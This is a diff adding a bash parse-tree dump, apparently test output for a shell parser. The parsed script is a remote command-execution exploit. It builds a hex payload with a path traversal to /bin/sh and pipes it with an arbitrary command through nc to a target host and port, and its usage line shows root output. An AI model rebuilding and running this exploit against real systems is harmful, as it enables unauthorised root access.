@@ -1,0 +1,193 @@
+ListNode(lineno=19, pos=(685, 849), parts=[
+  CommandNode(lineno=19, pos=(685, 697), parts=[
+    WordNode(lineno=19, pos=(685, 686), word='['),
+    WordNode(lineno=19, pos=(687, 689), word='$#', parts=[
+      ParameterNode(lineno=19, pos=(687, 689), value='#'),
+    ]),
+    WordNode(lineno=19, pos=(690, 693), word='-lt'),
+    WordNode(lineno=19, pos=(694, 695), word='3'),
+    WordNode(lineno=19, pos=(696, 697), word=']'),
+  ]),
+  OperatorNode(lineno=19, op='&&', pos=(698, 700)),
+  CommandNode(lineno=19, pos=(701, 838), parts=[
+    WordNode(lineno=19, pos=(701, 705), word='echo'),
+    WordNode(lineno=19, pos=(706, 709), word='-en'),
+    WordNode(lineno=19, pos=(710, 838), word='Syntax: `basename ${0}` <host> <port> <commands>nn`basename ${0}` 10.22.33.44 5555 id nX15 [12:1] uid=0(root) gid=0(root)\r\n', parts=[
+      CommandsubstitutionNode(command=
+        CommandNode(lineno=19, pos=(720, 733), parts=[
+          WordNode(lineno=19, pos=(720, 728), word='basename'),
+          WordNode(lineno=19, pos=(729, 733), word='${0}', parts=[
+            ParameterNode(lineno=19, pos=(729, 733), value='0'),
+          ]),
+        ]), lineno=19, pos=(719, 734)),
+      CommandsubstitutionNode(command=
+        CommandNode(lineno=19, pos=(764, 777), parts=[
+          WordNode(lineno=19, pos=(764, 772), word='basename'),
+          WordNode(lineno=19, pos=(773, 777), word='${0}', parts=[
+            ParameterNode(lineno=19, pos=(773, 777), value='0'),
+          ]),
+        ]), lineno=19, pos=(763, 778)),
+    ]),
+  ]),
+  OperatorNode(lineno=19, op='&&', pos=(839, 841)),
+  CommandNode(lineno=19, pos=(842, 849), parts=[
+    WordNode(lineno=19, pos=(842, 846), word='exit'),
+    WordNode(lineno=19, pos=(847, 849), word='0\r'),
+  ]),
+])
+CommandNode(lineno=20, pos=(851, 852), parts=[
+  WordNode(lineno=20, pos=(851, 852), word='\r'),
+])
+CommandNode(lineno=21, pos=(853, 889), parts=[
+  AssignmentNode(lineno=21, pos=(853, 889), word="HOST=`echo ${@} | awk '{print $1}'`\r", parts=[
+    CommandsubstitutionNode(command=
+      PipelineNode(lineno=21, pos=(859, 887), parts=[
+        CommandNode(lineno=21, pos=(859, 868), parts=[
+          WordNode(lineno=21, pos=(859, 863), word='echo'),
+          WordNode(lineno=21, pos=(864, 868), word='${@}', parts=[
+            ParameterNode(lineno=21, pos=(864, 868), value='@'),
+          ]),
+        ]),
+        PipeNode(lineno=21, pipe='|', pos=(869, 870)),
+        CommandNode(lineno=21, pos=(871, 887), parts=[
+          WordNode(lineno=21, pos=(871, 874), word='awk'),
+          WordNode(lineno=21, pos=(875, 887), word='{print $1}'),
+        ]),
+      ]), lineno=21, pos=(858, 888)),
+  ]),
+])
+CommandNode(lineno=22, pos=(890, 926), parts=[
+  AssignmentNode(lineno=22, pos=(890, 926), word="PORT=`echo ${@} | awk '{print $2}'`\r", parts=[
+    CommandsubstitutionNode(command=
+      PipelineNode(lineno=22, pos=(896, 924), parts=[
+        CommandNode(lineno=22, pos=(896, 905), parts=[
+          WordNode(lineno=22, pos=(896, 900), word='echo'),
+          WordNode(lineno=22, pos=(901, 905), word='${@}', parts=[
+            ParameterNode(lineno=22, pos=(901, 905), value='@'),
+          ]),
+        ]),
+        PipeNode(lineno=22, pipe='|', pos=(906, 907)),
+        CommandNode(lineno=22, pos=(908, 924), parts=[
+          WordNode(lineno=22, pos=(908, 911), word='awk'),
+          WordNode(lineno=22, pos=(912, 924), word='{print $2}'),
+        ]),
+      ]), lineno=22, pos=(895, 925)),
+  ]),
+])
+CommandNode(lineno=23, pos=(927, 980), parts=[
+  AssignmentNode(lineno=23, pos=(927, 980), word="CMD=`echo ${@} | sed 's/'$HOST'.*'${PORT}'\\ \\ *//g'`\r", parts=[
+    CommandsubstitutionNode(command=
+      PipelineNode(lineno=23, pos=(932, 978), parts=[
+        CommandNode(lineno=23, pos=(932, 941), parts=[
+          WordNode(lineno=23, pos=(932, 936), word='echo'),
+          WordNode(lineno=23, pos=(937, 941), word='${@}', parts=[
+            ParameterNode(lineno=23, pos=(937, 941), value='@'),
+          ]),
+        ]),
+        PipeNode(lineno=23, pipe='|', pos=(942, 943)),
+        CommandNode(lineno=23, pos=(944, 978), parts=[
+          WordNode(lineno=23, pos=(944, 947), word='sed'),
+          WordNode(lineno=23, pos=(948, 978), word="s/'$HOST'.*'${PORT}'\\ \\ *//g"),
+        ]),
+      ]), lineno=23, pos=(931, 979)),
+  ]),
+])
+CommandNode(lineno=24, pos=(981, 987), parts=[
+  AssignmentNode(lineno=24, pos=(981, 987), word='SC=\r'),
+])
+CommandNode(lineno=25, pos=(988, 1063), parts=[
+  AssignmentNode(lineno=25, pos=(988, 1063), word='SC=${SC}x00x00x00xa4x20x32x00x20x2dx2dx63x68x30x6bx73x2d\r', parts=[
+    ParameterNode(lineno=25, pos=(991, 996), value='SC'),
+  ]),
+])
+CommandNode(lineno=26, pos=(1064, 1139), parts=[
+  AssignmentNode(lineno=26, pos=(1064, 1139), word='SC=${SC}x00x20x30x00x20x53x59x53x54x45x4dx00x20x2dx63x68\r', parts=[
+    ParameterNode(lineno=26, pos=(1067, 1072), value='SC'),
+  ]),
+])
+CommandNode(lineno=27, pos=(1140, 1215), parts=[
+  AssignmentNode(lineno=27, pos=(1140, 1215), word='SC=${SC}x30x6bx73x2dx2dx00x20x43x00x20x32x30x00x20x2dx2d\r', parts=[
+    ParameterNode(lineno=27, pos=(1143, 1148), value='SC'),
+  ]),
+])
+CommandNode(lineno=28, pos=(1216, 1291), parts=[
+  AssignmentNode(lineno=28, pos=(1216, 1291), word='SC=${SC}x63x68x30x6bx73x2dx00x20x50x6fx63x00x20x2dx72x30\r', parts=[
+    ParameterNode(lineno=28, pos=(1219, 1224), value='SC'),
+  ]),
+])
+CommandNode(lineno=29, pos=(1292, 1367), parts=[
+  AssignmentNode(lineno=29, pos=(1292, 1367), word='SC=${SC}x30x74x2dx72x30x30x74x2dx00x20x2dx72x30x30x74x2d\r', parts=[
+    ParameterNode(lineno=29, pos=(1295, 1300), value='SC'),
+  ]),
+])
+CommandNode(lineno=30, pos=(1368, 1443), parts=[
+  AssignmentNode(lineno=30, pos=(1368, 1443), word='SC=${SC}x72x30x30x74x2dx00x20x2dx72x30x30x74x2dx72x30x30\r', parts=[
+    ParameterNode(lineno=30, pos=(1371, 1376), value='SC'),
+  ]),
+])
+CommandNode(lineno=31, pos=(1444, 1519), parts=[
+  AssignmentNode(lineno=31, pos=(1444, 1519), word='SC=${SC}x74x2dx00x20x30x00x20x30x00x20x2ex2ex2fx2ex2ex2f\r', parts=[
+    ParameterNode(lineno=31, pos=(1447, 1452), value='SC'),
+  ]),
+])
+CommandNode(lineno=32, pos=(1520, 1595), parts=[
+  AssignmentNode(lineno=32, pos=(1520, 1595), word='SC=${SC}x2ex2ex2fx2ex2ex2fx2ex2ex2fx2ex2ex2fx2ex2ex2fx2e\r', parts=[
+    ParameterNode(lineno=32, pos=(1523, 1528), value='SC'),
+  ]),
+])
+CommandNode(lineno=33, pos=(1596, 1671), parts=[
+  AssignmentNode(lineno=33, pos=(1596, 1671), word='SC=${SC}x2ex2fx2ex2ex2fx62x69x6ex2fx73x68x00x00x00x00x00\r', parts=[
+    ParameterNode(lineno=33, pos=(1599, 1604), value='SC'),
+  ]),
+])
+CommandNode(lineno=34, pos=(1672, 1747), parts=[
+  AssignmentNode(lineno=34, pos=(1672, 1747), word='SC=${SC}x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00\r', parts=[
+    ParameterNode(lineno=34, pos=(1675, 1680), value='SC'),
+  ]),
+])
+CommandNode(lineno=35, pos=(1748, 1795), parts=[
+  AssignmentNode(lineno=35, pos=(1748, 1795), word='SC=${SC}x00x00x00x00x00x00x00x00x00\r', parts=[
+    ParameterNode(lineno=35, pos=(1751, 1756), value='SC'),
+  ]),
+])
+CommandNode(lineno=36, pos=(1796, 1797), parts=[
+  WordNode(lineno=36, pos=(1796, 1797), word='\r'),
+])
+CommandNode(lineno=37, pos=(1798, 1814), parts=[
+  AssignmentNode(lineno=37, pos=(1798, 1814), word='SHELLCODE=${SC}\r', parts=[
+    ParameterNode(lineno=37, pos=(1808, 1813), value='SC'),
+  ]),
+])
+PipelineNode(lineno=38, pos=(1815, 1880), parts=[
+  CompoundNode(lineno=38, list=[
+    ReservedwordNode(lineno=38, pos=(1815, 1816), word='('),
+    ListNode(lineno=38, pos=(1817, 1852), parts=[
+        CommandNode(lineno=38, pos=(1817, 1838), parts=[
+          WordNode(lineno=38, pos=(1817, 1821), word='echo'),
+          WordNode(lineno=38, pos=(1822, 1825), word='-en'),
+          WordNode(lineno=38, pos=(1826, 1838), word='${SHELLCODE}', parts=[
+            ParameterNode(lineno=38, pos=(1826, 1838), value='SHELLCODE'),
+          ]),
+        ]),
+        OperatorNode(lineno=38, op=';', pos=(1839, 1840)),
+        CommandNode(lineno=38, pos=(1841, 1852), parts=[
+          WordNode(lineno=38, pos=(1841, 1845), word='echo'),
+          WordNode(lineno=38, pos=(1846, 1852), word='${CMD}', parts=[
+            ParameterNode(lineno=38, pos=(1846, 1852), value='CMD'),
+          ]),
+        ]),
+      ]),
+    ReservedwordNode(lineno=38, pos=(1853, 1854), word=')'),
+  ], pos=(1815, 1854)),
+  PipeNode(lineno=38, pipe='|', pos=(1855, 1856)),
+  CommandNode(lineno=38, pos=(1857, 1880), parts=[
+    WordNode(lineno=38, pos=(1857, 1859), word='nc'),
+    WordNode(lineno=38, pos=(1860, 1863), word='-w1'),
+    WordNode(lineno=38, pos=(1864, 1871), word='${HOST}', parts=[
+      ParameterNode(lineno=38, pos=(1864, 1871), value='HOST'),
+    ]),
+    WordNode(lineno=38, pos=(1872, 1880), word='${PORT}\r', parts=[
+      ParameterNode(lineno=38, pos=(1872, 1879), value='PORT'),
+    ]),
+  ]),
+])
